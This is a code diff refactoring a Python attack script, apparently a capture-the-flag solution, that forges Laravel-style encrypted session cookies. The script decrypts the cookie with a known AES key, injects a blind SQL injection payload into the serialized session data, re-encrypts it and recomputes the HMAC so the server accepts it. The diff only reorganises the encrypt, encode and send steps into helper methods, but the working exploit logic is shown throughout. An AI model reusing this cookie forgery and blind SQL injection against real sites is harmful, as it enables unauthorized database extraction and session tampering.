@@ -24,12 +24,12 @@ class Aes:
 		self.key = key
 		self.iv = None
 
-	def encrypt(self, pt, iv):
-		cipher = AES.new(self.key, AES.MODE_CBC, iv)
+	def encrypt(self, pt):
+		cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
 		return cipher.encrypt(pad(pt, 16))
 
-	def decrypt(self, ct, iv):
-		cipher = AES.new(self.key, AES.MODE_CBC, iv)
+	def decrypt(self, ct):
+		cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
 		return unpad(cipher.decrypt(ct), 16)
 
 class cookie_bsqli:
@@ -64,21 +64,43 @@ class cookie_bsqli:
 		cookie_dict = json.loads(cookie_json)
 		return cookie_dict, cookie_id
 
-	def __decrypt_value(self):
+	def __decode_value(self):
 		"""
-		Next we decode the target cookie's json "value" and "iv" base64 encoded strings
+		Decode the target cookie's json "value" and "iv" base64 encoded strings
 		"""
 		encrypted_val = b64decode(self.cookie_dict['value'])
 		self.aes.iv = b64decode(self.cookie_dict['iv'])
+		return encrypted_val
+
+	def __decrypt_value(self):
+		"""
+		Decode the target cookie's json "value" and "iv" base64 encoded strings
+		"""
+		encrypted_val = self.__decode_value()
 
 		"""
-		Next we decrypt the encrypted "value" raw bytes and parse the json "value" data into a dictionary
+		Decrypt the encrypted "value" raw bytes and parse the json "value" data into a dictionary
 		"""
-		json_val = self.aes.decrypt(encrypted_val, self.aes.iv)
+		json_val = self.aes.decrypt(encrypted_val)
 		value_data = json.loads(json_val)
 		return phpserialize.loads(value_data['data'].encode())
 
-	def __send_payload(self, payload_fstr, pos, ch):
+	def __encode_value(self, encrypted_nval):
+		b64_encrypted_nval = b64encode(encrypted_nval).decode()
+
+		"""
+		Modify the original cookie_dict extracted from the first step to contain the injected value payload and newly generated hmac
+		"""
+		self.cookie_dict['value'] = b64_encrypted_nval
+		self.cookie_dict['mac'] = hmac.new(self.aes.key, (self.cookie_dict['iv']+self.cookie_dict['value']).encode(), hashlib.sha256).hexdigest()
+
+		"""
+		Convert cookie_dict to json then base64
+		"""
+		return json.dumps(self.cookie_dict).encode()
+
+
+	def __encrypt_value(self, payload_fstr, pos, ch):
 		"""
 		We now have the target cookie data that we can inject with our constructed BLIND-SQLI payload
 		"""
@@ -95,20 +117,12 @@ class cookie_bsqli:
 		"""
 		Encrypt the injected data object contained in the target cookie
 		"""
-		encrypted_nval = self.aes.encrypt(json_nval, self.aes.iv)
-		b64_encrypted_nval = b64encode(encrypted_nval).decode()
+		encrypted_nval = self.aes.encrypt(json_nval)
+		cookie_payload = self.__encode_value(encrypted_nval)
+		return b64encode(cookie_payload).decode()
 
-		"""
-		Modify the original cookie_dict extracted from the first step to contain the injected value payload and newly generated hmac
-		"""
-		self.cookie_dict['value'] = b64_encrypted_nval
-		self.cookie_dict['mac'] = hmac.new(self.aes.key, (self.cookie_dict['iv']+self.cookie_dict['value']).encode(), hashlib.sha256).hexdigest()
-
-		"""
-		Convert cookie_dict to json then base64 and url encode it
-		"""
-		cookie_payload = json.dumps(self.cookie_dict).encode()
-		b64_cookie_payload = b64encode(cookie_payload).decode()
+	def __send_payload(self, payload_fstr, pos, ch):
+		b64_cookie_payload = self.__encrypt_value(payload_fstr, pos, ch)
 
 		"""
 		Now set the current session cookie's to our injected cookie + nginxatsu_session
@@ -174,4 +188,3 @@ def main():
 
 if __name__ == '__main__':
 	main()
-
